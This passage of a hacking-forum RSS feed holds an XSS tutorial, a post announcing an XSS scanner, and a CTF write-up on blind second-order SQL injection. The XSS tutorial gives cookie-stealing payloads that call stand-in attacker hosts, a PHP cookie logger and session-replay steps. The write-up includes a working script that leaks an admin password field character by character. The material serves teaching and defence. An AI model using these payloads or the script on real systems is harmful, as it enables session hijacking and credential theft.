+<p>An attacker set up a website that contains legitimate financial advice and an array of links to different financial institutions. The links to each and every financial institution were manipulated to incorporate XSS attacks designed to allow the attacker to hijack the sessions of users who are susceptible to attack. Upon clicking a link, the following code will be sent as a request to a vulnerable application on <a href="http://www.fakebank.com" rel="nofollow noopener">http://www.fakebank.com</a>. The iframe is one pixel by one pixel in size, so the probability of users finding out that their sessions are being hijacked is less than it would be if one was to use a JavaScript redirect, for example. Below is an example of a maliciously<br>
+crafted link.</p>
+<pre><code class="lang-auto">&lt;a href='http://www.fakebank.com/viewaccountinfo.php?info=&gt;&lt;iframe width=1 height=1 scrolling=no  
+
+src=‘http://www.attackerhost.com/cookielogger.php?cookie=’+unescape(document.cookie)&gt;‘&gt;FakeBank
+Online
+</code></pre>
+<p>Upon clicking the link, the user’s cookie would be transferred, through the iframe, to an external script on <a href="http://www.attackerhost.com" rel="nofollow noopener">http://www.attackerhost.com</a>. The external script would then write the cookie to a log file for later use. An example of a functional cookie-logging script is as follows:</p>
+<pre><code class="lang-auto">&lt;?php  
+    $filename = 'logfile.txt';  
+    if (is_writable($filename)) {  
+        if (!$handle = fopen($filename, 'a')) {  
+            echo "Cannot open file ($filename)";  
+            exit;  
+        }  
+        if (fwrite($handle, $cookie) === FALSE) {  
+            echo "Cannot write to file ($filename)";  
+            exit;  
+        }  
+        echo "Success, wrote the information to the log file";  
+        fclose($handle);  
+    } else {  
+        echo "The file is not writable";  
+    }  
+?&gt;  
+</code></pre>
+<p>After a cookie is obtained, the attacker can use an application that is capable of sending http requests to hijack the corresponding user’s session. Three available applications for sending http requests are Firefox (Using the LivehttpHeaders Extension), Proxomitron, and BurpSuite. I will explain how to do this with two of the mentioned applications.</p>
+<p><em>Instructions for Cookie Alteration in Firefox with LiveHttpHeaders</em></p>
+<ol>
+<li>Install the LivehttpHeaders extension and restart your browser.</li>
+<li>Click Tools&gt;&gt;LivehttpHeaders and visit the website that you got the cookie from</li>
+<li>Highlight the main script request and click the replay button</li>
+<li>Replace the current cookie information with your cached information. (Cookie:)</li>
+</ol>
+<h2>Inducing User Actions</h2>
+<p>Although session hijacking accounts for the majority of First Order XSS Attack scenarios on the web, it is not always the most efficient attack type.</p>
+<p>Inducing user actions through Request Forgery is an alternative to session hijacking, frequently utilized by attackers when stealth in an emphasized concern. Request Forgery allows an attacker to completely bypass authentication mechanisms, exploiting an active client/server trust relationship to cause a user to carry out malicious actions via the target application. In summation, this attack type establishes a proxy-like relationship between the attacker and the user.</p>
+<h2>Prevention</h2>
+<p>Prevention methods for Cross Site Scripting have been under development since the discovery of the attack; however, that development has yielded little success until recent years. The most successful approach to-date used to prevent XSS is as follows:</p>
+<ol>
+<li>Choose a target application.</li>
+<li>Isolate every function within the application by which user-controlled data is returned in the application’s response.</li>
+<li>Validate all user supplied input by ensuring that all submitted data contains only permitted characters, and that the length of the data meets set requirements. A combination of these two methods and other preventative validations is most effective because it requires that the submitted data conforms to an established standard.</li>
+<li>Sanitize all application returned output by encoding all data that could be hazardous when displayed to users if left untouched. Encoding, or completely removing, all non-alphanumeric characters is the most reliable approach to sanitization.</li>
+<li>Repeat steps one through four to secure other web applications on the web site.</li>
+</ol>
+<h1>Second Order</h1>
+<p>This vulnerability arises when data is submitted to a web application by a user, then stored persistently on the server (typically in a back-end database or file system), and later displayed to other users on a web page without being properly filtered or sanitized.</p>
+<p>Because second order XSS attacks involve specifically crafted malicious code that is first stored on the server, and then displayed to other users, the attack script is rendered more than once, enabling an attacker to affect multiple users with very little effort.</p>
+<h2>Discovery</h2>
+<p>The process of detecting second order XSS vulnerabilities is similar to the method discussed in the previous sections, which address the detection of First Order XSS vulnerabilities; however, in order to maximize the number of vulnerabilities identified, further investigation must be done.</p>
+<ol>
+<li>Follow the steps in section 0x211. Monitor the application’s responses for instances in which the submitted data is stored persistently on the server and then returned to the browser.</li>
+<li>Check file upload, file transfer, and file creation scripts for vulnerabilities. Frequently, these types of applications do not contain functions to validate and sanitize file contents, leaving them open to a wide array of attacks.</li>
+<li>Check scripts that handle statistics and error logs to see if manipulating their output is possible.</li>
+<li>Use XSS in combination with other computer security exploits to check for other avenues of attack.</li>
+<li>Check everything else! Twice!</li>
+</ol>
+<h2>Exploitation</h2>
+<p>The purpose of this sub-section is to provide an aid in understanding Cross Site Scripting exploitation through real-world examples of XSS attacks. Each of the examples below is designed to emulate a commonly encountered attack scenario on the web.</p>
+<h2>XSS Virii</h2>
+<p>As mentioned previously within this document, First Order XSS Request Forgery allows an attacker to leverage a Cross Site Scripting attack payload to cause a user to issue requests against a target application; however, the non-persistent nature of First Order XSS leaves the most potentially devastating implications of this attack type completely untapped.</p>
+<p>One of the major drawbacks of the First Order version of this attack is that the introduced attack payload is delivered and executed by means of a single request and response, affecting a maximum of one user at a time. Second Order Request Forgery XSS harnesses the power to manipulate the actions of, potentially, an unlimited amount of users in an exponentiallydamaging, proxy-chain-like array of requests to a vulnerable web application.</p>
+<h3>Example No. One</h3>
+<p>The Samy worm was a self-propagating cross-site scripting worm developed to propagate across the MySpace social-networking site. The worm was released on October 4, 2005, and in less than 20 hours, infected over one million MySpace users.</p>
+<p>The process of how the Samy worm worked, according to its creator, is as follows:</p>
+<ul>
+<li>A maliciously crafted JavaScript code was first placed in the profile of a single user - in this case, Samy was that user.</li>
+<li>Upon viewing the MySpace profile that contains the worm, the malicious code was automatically executed. The code would edit the profile of all viewing users, adding Samy as a friend and appending him as a hero. The method used to do this required multiple<br>
+requests (GETs and POSTs) to the server via Asynchronous JavaScript and XML (Ajax). By running these background requests, the script was able to completely bypass the need for user actions (User Requests, Confirmations, etc.).</li>
+<li>The most dangerous attribute of the code is that it was self-replicating. Upon execution of the code, it was copied and assigned to its own variable, obfuscated to avoid filters, and then sent as its own request to the server. The issued request would trigger the server to<br>
+add the script to the profile of the viewing user(s).</li>
+<li>The entire process would start over whenever the profiles of the newly infected users were viewed.</li>
+</ul>
+<p>The Samy virus became one of the fastest spreading viruses of all time, and Samy became one of the most popular MySpace users of all time. The spreading of the virus was so rapid that it actually created a denial-of-service attack, because of the exponential growth of the Samy’s friends list.</p>
+<h2>Bugging File Handlers</h2>
+<p>Frequently, file handling application do not contain functions to validate and sanitize file contents, leaving them defenseless against Second Order XSS.</p>
+<p>This type of attack differs from all of the attacks previously mentioned in that malicious code is not injected directly into a web page; instead, the attack is launched via a separate file that contains malicious code, which is introduced by an attacker.</p>
+<h3>Example No. One</h3>
+<p>Target: <a href="http://www.fakeelectronicart.com" rel="nofollow noopener">http://www.fakeelectronicart.com</a><br>
+Intention: Financial Gain</p>
+<p>An attacker submitted a piece of art, created using an SWF design tool, to the Fake Electronic Art website. The site allows users to display their art as well as auction it off. The art that the attacker submitted contains the following script, which runs undetected in the background:</p>
+<pre><code class="lang-auto">getURL("javascript:location='http://www.externalhost.com/cookielogger.php?  
+cookie='+document.cookie")  
+</code></pre>
+<p>This script sends user session data to a script on a remote server. The external script would then write the data to a log file for later use.</p>
+<h2>Prevention</h2>
+<p>Prevention methods for Second Order XSS are more complex than those of the First Order category because Second Order attack vectors are more diverse; however, the fundamental defensive measures are the same. To prevent Second Order XSS, try the following:</p>
+<ol>
+<li>Be sure to validate user supplied data and to sanitize application responses that correspond to items that are stored persistently on the server.</li>
+<li>Check file upload, file transfer, and file creation scripts for vulnerabilities. If vulnerabilities exist, validate file headers and footers of permitted file types.</li>
+<li>Validate HTTP headers</li>
+<li>Sanitize all log files by purging hazardous characters.</li>
+<li>Check everything else! Twice!</li>
+</ol>
+<p>Hope you learned something from this article!</p>
+            <p><small>5 posts - 3 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/practical-applications-of-xss/18699">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/practical-applications-of-xss/18699</link>
+          <pubDate>Mon, 20 Jan 2020 15:55:07 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-18699</guid>
+          <source url="https://d.clarkee.co.uk/t/practical-applications-of-xss/18699.rss">Practical Applications of XSS</source>
+        </item>
+        <item>
+          <title>A powerful xss scanner for scanning many urls</title>
+          <dc:creator><![CDATA[lwzSoviet]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
+      <a href="https://github.com/lwzSoviet/NoXss" target="_blank" rel="noopener nofollow ugc">GitHub</a>
+  </header>
+  <article class="onebox-body">
+    <img src="/uploads/default/original/2X/3/3e00abbf188a8801fa8b01aa4785172a78395c35.png" class="thumbnail onebox-avatar" width="400" height="400">
+
+<h3><a href="https://github.com/lwzSoviet/NoXss" target="_blank" rel="noopener nofollow ugc">lwzSoviet/NoXss</a></h3>
+
+<p>Faster xss scanner,support  reflected-xss and dom-xss - lwzSoviet/NoXss</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+<h1>0x01Why I make this tool?</h1>
+<p>I’m working in a electronic commerce company as information security engineer, I need analyse risk in logs from online system. Log’s size is always more than TB. It’s hard to find vulnerability manually. So we  develope our tools for scanning work every day.</p>
+<h1>0x02 What’s “NoXss”?</h1>
+<p>“NoXss” is a plugin  of our Web Scanner named Tiamat, a powerful xss scanner . It’s really faster  and suitable for scanning big data.  We have used it to find 300+ xss rencently.</p>
+<ul>
+<li>It used only 5 payloads based param’s position to find xss risk rather than fuzzing. Fuzzing is open slowly and blind.</li>
+<li>Phantomjs &amp; Chrome are used in this tool. That means it supports DOM based xss. We can open 4 or more browsers to work together, means faster.</li>
+<li>Analysis. NoXss will create save many files for helping to analyse xss for users because some xss is diffcult to scan,such as Multiparted form request, WAF’s deny, 302 redirect, etc.</li>
+<li>Work with Burpsuite.  User can export their traffic data from Burpsuite to **.xml, then scan it. This is really a good function.</li>
+<li>Support some headers like Cookie, Referer, Token or others,  this tool will add it automatically. So you don’t worry the logined state or some header’s check in backend.</li>
+<li>NoXss is highly concurrent for using coroutine(Gevent).</li>
+</ul>
+<h1>0x03 Some result we have found</h1>
+<p>In fact, NoXss find lots of xss every day. Following are some example:<br>
+Sorry these examples are not allowed to open by 0x00sec’s admin.</p>
+<h1>0x04 How to use it?</h1>
+<p>See details in <a href="https://github.com/lwzSoviet/NoXss" rel="noopener nofollow ugc">https://github.com/lwzSoviet/NoXss</a>. We have a release at <a href="https://github.com/lwzSoviet/NoXss/releases/tag/v1.0-beta" rel="noopener nofollow ugc">https://github.com/lwzSoviet/NoXss/releases/tag/v1.0-beta</a></p>
+<h1>0x05 Our Plan</h1>
+<p>We  decide to open this plugin at <a href="https://github.com/lwzSoviet/NoXss" rel="noopener nofollow ugc">https://github.com/lwzSoviet/NoXss</a> firstly. The whole scanner “Tiamat” need more better plugins like command injection, ssrf, etc. We will open it in a few time.<br>
+Using “NoXss” and give me some advice or issues if you have interest in it.</p>
+<p><em>Don’t forget to Star it if it’s helpful to you</em><img src="https://0x00sec.org/images/emoji/twitter/v.png?v=9" title=":v:" class="emoji only-emoji" alt=":v:"></p>
+            <p><small>2 posts - 1 participant</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/a-powerful-xss-scanner-for-scanning-many-urls/18225">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/a-powerful-xss-scanner-for-scanning-many-urls/18225</link>
+          <pubDate>Mon, 23 Dec 2019 03:01:34 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-18225</guid>
+          <source url="https://d.clarkee.co.uk/t/a-powerful-xss-scanner-for-scanning-many-urls/18225.rss">A powerful xss scanner for scanning many urls</source>
+        </item>
+        <item>
+          <title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</title>
+          <dc:creator><![CDATA[chivato]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a good development topic for a post on the 0x00sec forums. I have included the intended method of exploitation, and some others that I found interesting, that may be useful in situations of bug bounties or pentests.</p>
+<p><strong>Introduction</strong><br>
+Let me start by saying that this article assumes that you understand the fundamentals of SQL Injection, and you are comfortable with exploiting basic SQL Vulnerabilities.</p>
+<p>If you have ever looked into the topic in depth enough, you will have realized that depending on where the injection point is in the query, the limitations may vary, and the difficulty of exploitation may increase.</p>
+<p>In this post I will be talking about some of the independent research I have undergone over the past week, relating to Blind Second Order SQL Injections in ORDER BY clauses.</p>
+<p>I am going to individually explain the parts of this vulnerability, and then demonstrate how I was able to develop a solution for each individual problem that Blind Second Order SQL Injections may present.</p>
+<p><strong>Blind SQL Injection</strong>:<br>
+<em>Explanation</em><br>
+Blind SQL Injections are any SQL Injections where direct database output is not offered, so you are essentially trying to leak data “blindly”. An example of this could be a logging system, where they insert the logs into a table, and you never see the logs, or the commands output. A basic solution for this would be using the sleep() function that most, if not all DBMS’ have.</p>
+<p><em>Explanation of solution</em><br>
+The sleep function causes the DBMS to not respond for a set amount of time, meaning that you can convert your query into some sort of a boolean query so the output is true or false, and if it is true, then make the DBMS sleep, due to the DBMS sleeping, the server response time will be longer, and you will be able to tell what the boolean SQL queries output was.</p>
+<p><em>Example boolean sleep SQL Query</em><br>
+<code>IF ([CONDITION]) THEN sleep(3); ELSE sleep(0); END IF; END;</code></p>
+<p>In the example above, it checks whether the condition is true or false, and then depending on the conditions output, it will either sleep for 3 seconds, or 0 seconds.</p>
+<p>Although, in our situation, instead of using sleep, we will be making the post order either be alphabetically ordered title or alphabetically ordered contents, so we can create a post called “A” with “Z” as the contents, and another post called “Z” with “A” as the contents.</p>
+<p><strong>Second Order SQL Injection</strong>:<br>
+<em>Explanation</em><br>
+For the people who may not have heard of Second Order SQL Injections, here is a perfect explanation pulled directly from <a href="https://portswigger.net/kb/issues/00100210_sql-injection-second-order" class="inline-onebox" rel="noopener nofollow ugc">SQL injection (second order) - PortSwigger</a></p>
+<blockquote>
+<p>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.</p>
+</blockquote>
+<p>Due to second order SQL Injections not taking user input directly from the user, but instead storing it in another part of the database or backed (it could be stored in a cookie), it is generally harder to recognize and find in larger applications.</p>
+<p><strong>Injection point being the ORDER BY clause</strong>:<br>
+<em>Explanation</em><br>
+SQL Query syntax is extremely specific, and not flexible enough for the usual SQL Injection payloads that make use of UNION to append data onto what the database already responds with.</p>
+<p><em>Explanation of solution</em><br>
+After some research, I came to the conclusion* that if the injection point is directly after the ORDER BY clause (for example: <code>SELECT * FROM users WHERE name = "test" ORDER BY USER-INPUT;</code>) then you can make use of the CASE clause that exists in certain DBMS’, for my research I used MySQL as the DBMS of choice.</p>
+<p>The technique I have managed to come up with for this explicit situation looks something like this:<br>
+<code>(SELECT (CASE WHEN EXISTS(SELECT [column] FROM [table] WHERE [column] REGEXP "^.*" AND [FURTHER CONDITIONS]) THEN [One column name] ELSE [Another column name] END));</code></p>
+<p>Here are some examples of testing this query on MySQL directly:</p>
+<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^.*") THEN post_
+creation_time ELSE post_content END));
++---------------+---------------------------------------------------+---------------------+
+| post_title    | post_content                                      | post_creation_time  |
++---------------+---------------------------------------------------+---------------------+
+| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
+| test          | tteetteet                                         | 2019-11-29 15:10:15 |
++---------------+---------------------------------------------------+---------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^x.*") THEN post
+_creation_time ELSE post_content END));
++---------------+---------------------------------------------------+---------------------+
+| post_title    | post_content                                      | post_creation_time  |
++---------------+---------------------------------------------------+---------------------+
+| test          | tteetteet                                         | 2019-11-29 15:10:15 |
+| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
++---------------+---------------------------------------------------+---------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+<p>As demonstrated above, when the regex that the password is compared to returns true, the posts are ordered by the post title (F is before t in the alphabet, so <code>From: chivato</code> is displayed before the <code>test</code> post). The opposite can also be seen in the next query, where the regex now checks if the password field entry starts with “x” (this has to be false since I am using md5 to hash my passwords, and there will never be an x in an md5 hash due to the hex encoding), due to this query being false, the posts are now ordered by post contents (t is before W in the alphabet, so the posts that have content starting with <code>t</code> are displayed before the ones that have contents starting with <code>W</code>).</p>
+<p><strong>Breakdown</strong>:<br>
+Now let’s break this query down, and explain each separate part of it, to facilitate the visualization of the situation / back-end processing, I have developed a vulnerable social media app (the Shitter webapp used in the CTF), where a user can create a post and then change the order of these posts (this is the injection point) in settings, where the order selected is inserted into the user’s server signed cookie, the contents of the “order” value in the cookie are then placed directly into a SQL query (inside the ORDER BY clause), finall being executed when the posts are being taken from the database (when a profile is being loaded up).</p>
+<p>So, the initial SELECT() inserts the internal queries output into the end of the query, inside that parentesis, we have an EXIST(SELECT…), this exist converts the query to a boolean query, since it makes it so that, if there is an output for the select query in the center of the nested query, then the exist will output 1, if not, it will return 0, 1 being true, 0 being false.</p>
+<p>This is where the CASE part comes in, if the EXIST part of the statement responds with 1, then the case will order by the first column specified, if not, it will order by the second column specified, so you can go to the page used to trigger the second order SQLi, and depending on the output order of the posts, you will know if the EXISTS returned 0 or 1.</p>
+<p>Finally, the inside of the EXISTS() function is a normal query, that uses a REGEXP to bruteforce one character at a time (if it is a hash, then you only need a-f and 0-9, due to hex encoding on the ‘mainstream’ hashes). In our case we want to leak a flag, so I have developed the following script that bruteforces the REGEXP character by character using a set dictionary of basic alhpanumeric chars (a-zA-Z0-9).</p>
+<p>Essentially, instead of using the sleep function (which would be much slower and would not work due to the situation of the injection point), we make use of the fact that we have control over the ORDER BY clause, and use this as our true / false identifier instead of the response time of the server.</p>
+<p><strong>Shitter solution</strong>:</p>
+<p>Upon finding the injection point we see “post_creation_time asc”, which could only fit in the ORDER BY clause of a SQL Query, so we know where our injection is being inserted into, let’s see if it is vulnerable.</p>
+<p>So we send the request to update the post order and add a <code>'</code> on the end:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png" data-download-href="/uploads/short-url/xO8XzaRYSW2CCY6JFxw6S899yhK.png?dl=1" title=""><img src="/uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png" alt="" data-base62-sha1="xO8XzaRYSW2CCY6JFxw6S899yhK" role="presentation" width="690" height="315"></a></div><p></p>
+<p>Now we try and trigger the SQL Query by loading a users posts:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d.png" data-download-href="/uploads/short-url/bWplXF2cdFb4Jvxj0i7bplQAzql.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png" alt="" data-base62-sha1="bWplXF2cdFb4Jvxj0i7bplQAzql" role="presentation" width="690" height="353" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1035x529.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1380x706.png 2x"></a></div><p></p>
+<p>Perfect, we get a sql error due to the unterminated string (this is due to the standalone <code>'</code>).</p>
+<p>Now we can get to the actual injection, we know we control anything after the ORDER BY clause, so we control the posts order, I wonder if there is a way of using IF statements in MySQL, initially I came across this: <a href="http://www.mysqltutorial.org/mysql-if-statement/" class="inline-onebox" rel="noopener nofollow ugc">MySQL IF Statement</a>, although I was not able to get this to work, I believe this is due to the IF statement needing to either be at the start of the query, or in a set SQL procedure.</p>
+<p>Then I remembered there being a similar “CASE” (<a href="https://www.w3schools.com/sql/func_mysql_case.asp" class="inline-onebox" rel="noopener nofollow ugc">MySQL CASE Function</a>) clause in MySQL that has a very similar functionality, if not identical to IF statements, which can be placed anywhere in a SQL query, so I tried it in my make-shift shitter database and boom! It works (after a while of fiddling with the statement).</p>
+<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=1) THEN post_creation_time ELSE post_content END));
++------------+--------------+---------------------+
+| post_title | post_content | post_creation_time  |
++------------+--------------+---------------------+
+| A          | Z            | 2019-12-17 13:21:20 |
+| Z          | A            | 2019-12-17 13:21:25 |
++------------+--------------+---------------------+
+2 rows in set (0.02 sec)
+
+MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=2) THEN post_creation_time ELSE post_content END));
++------------+--------------+---------------------+
+| post_title | post_content | post_creation_time  |
++------------+--------------+---------------------+
+| Z          | A            | 2019-12-17 13:21:25 |
+| A          | Z            | 2019-12-17 13:21:20 |
++------------+--------------+---------------------+
+2 rows in set (0.01 sec)
+
+MariaDB [shitter]&gt;
+</code></pre>
+<p>So we now have a working injection, let’s try it on shitter, first we make the condition true:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png" data-download-href="/uploads/short-url/zqKOBMoQBxSDZpjH0TVDAmxueZV.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png" alt="" data-base62-sha1="zqKOBMoQBxSDZpjH0TVDAmxueZV" role="presentation" width="690" height="279" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png, /uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 1.5x, /uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 2x"></a></div><br>
+And we trigger the SQL Injection:<br>
+<div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" data-download-href="/uploads/short-url/3CfsCSdmhre230NkkOa6m0lkFbR.png?dl=1" title=""><img src="/uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" alt="" data-base62-sha1="3CfsCSdmhre230NkkOa6m0lkFbR" role="presentation" width="690" height="401"></a></div><br>
+Cool, so the posts were ordered by the post_title, and not the contents.<p></p>
+<p>Now let’s demonstrate the other way around:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png" data-download-href="/uploads/short-url/gFY8Dg4sgaYBxAovTfpk5WyFCPL.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png" alt="" data-base62-sha1="gFY8Dg4sgaYBxAovTfpk5WyFCPL" role="presentation" width="690" height="178" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png, /uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 1.5x, /uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 2x"></a></div><br>
+<div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" data-download-href="/uploads/short-url/7RbVNbzdWX7LWqUNlcPb2qxkjBQ.png?dl=1" title=""><img src="/uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" alt="" data-base62-sha1="7RbVNbzdWX7LWqUNlcPb2qxkjBQ" role="presentation" width="690" height="379"></a></div><p></p>
+<p>We have confirmed that depending on whether the output of the statement is 0 or 1, the post will either be ordered by title, or contents. We can combine this idea with EXISTS() (<a href="https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html" rel="noopener nofollow ugc">https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html</a>) and REGEXP (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" class="inline-onebox" rel="noopener nofollow ugc">MySQL REGEXP operator - w3resource</a>) to slowly leak the contents of the admin password field.</p>
+<p>I developed a short script to automate this:</p>
+<pre data-code-wrap="python"><code class="lang-python">import requests, time
+
+s = requests.Session()
+dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
+URL = "http://gusralph.info:5000"
+username = "demo"
+password = "demo"
+data = {'name' : username, 'password' : password}
+r = s.post(url = URL + "/login", data = data)
+final = ""
+
+while True:
+        data = {'order' : 'post_creation_time ASC'}
+        r = s.post(url = URL + "/settings", data = data)
+        for x in dictionary:
+                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
+                r = s.post(url = URL + "/settings", data = data)
+                out = s.get(url = URL + "/profile/2")
+                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
+                        final += x
+                        print "Leaking contents of admin hash: " + final
+                        break
+                else:
+                        pass
+</code></pre>
+<p>This script manages to leak the contents of the admin password field:</p>
+<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
+Leaking contents of admin hash: t
+Leaking contents of admin hash: tm
+Leaking contents of admin hash: tmh
+Leaking contents of admin hash: tmhc
+Leaking contents of admin hash: tmhc{
+Leaking contents of admin hash: tmhc{b
+Leaking contents of admin hash: tmhc{bl
+Leaking contents of admin hash: tmhc{bl1
+[...]
+Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinje
+Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjec
+Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinject
+Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti
+Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0
+Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n
+Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n}
+</code></pre>
+<p>Although, the MySQL REGEXP function is not case sensitive (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" class="inline-onebox" rel="noopener nofollow ugc">MySQL REGEXP operator - w3resource</a>), so I added the <code>BINARY</code> function after the REGEXP to create the final script:</p>
+<pre data-code-wrap="python"><code class="lang-python">import requests, time
+
+s = requests.Session()
+dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
+URL = "http://gusralph.info:5000"
+username = "demo"
+password = "demo"
+data = {'name' : username, 'password' : password}
+r = s.post(url = URL + "/login", data = data)
+final = ""
+
+while True:
+        data = {'order' : 'post_creation_time ASC'}
+        r = s.post(url = URL + "/settings", data = data)
+        for x in dictionary:
+                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP BINARY "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
+                r = s.post(url = URL + "/settings", data = data)
+                out = s.get(url = URL + "/profile/2")
+                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
+                        final += x
+                        print "Leaking contents of admin hash: " + final
+                        break
+                else:
+                        pass
+</code></pre>
+<p>With the final result being:</p>
+<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
+Leaking contents of admin hash: T
+Leaking contents of admin hash: TM
+Leaking contents of admin hash: TMH
+Leaking contents of admin hash: TMHC
+Leaking contents of admin hash: TMHC{
+Leaking contents of admin hash: TMHC{B
+[..]
+Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJect
+Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti
